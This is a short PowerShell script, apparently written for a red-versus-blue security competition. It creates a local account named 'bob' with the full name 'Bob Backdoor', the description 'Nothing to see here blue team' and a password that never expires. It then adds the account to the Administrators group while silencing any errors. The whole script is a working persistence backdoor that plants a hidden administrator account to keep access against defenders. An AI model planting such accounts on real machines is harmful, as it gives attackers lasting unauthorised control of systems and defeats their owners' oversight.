#--------------------------------------------------------------
#  Script Local Account | NMake a local admin account
# Branched from All in one | Script for start of comp | Version | 1.26.5
# Made by Logan Schultz
#Version | 1.0
#--------------------------------------------------------------
$ProgressPreference = 'SilentlyContinue'
function local-account {
    #--------------------------------------------------------------
    #Create look backup account | Back Door Bob
    #--------------------------------------------------------------
    # $password get the password from a user input
    $Password = Read-Host -AsSecureString
    $params = @{
        Name        = 'bob'
        Password    = $Password
        FullName    = 'Bob Backdoor'
        Description = 'Nothing to see here blue team'
    }

    Write-Host "Created new user" -ForegroundColor Green
    #Creates a local User
    New-LocalUser @params -PasswordNeverExpires -ErrorAction SilentlyContinue

    Write-Host "Added new user to Administrator's group" -ForegroundColor Green

    #Adds the new user to the Administrators group
    Add-LocalGroupMember -Group "Administrators" -Member "bob" -ErrorAction SilentlyContinue

    Write-Host "-----------------------------------------" -ForegroundColor Green
    Write-Host "|        Backup Account Created         |" -ForegroundColor Green
    Write-Host "-----------------------------------------" -ForegroundColor Green
} # Choice Five
local-account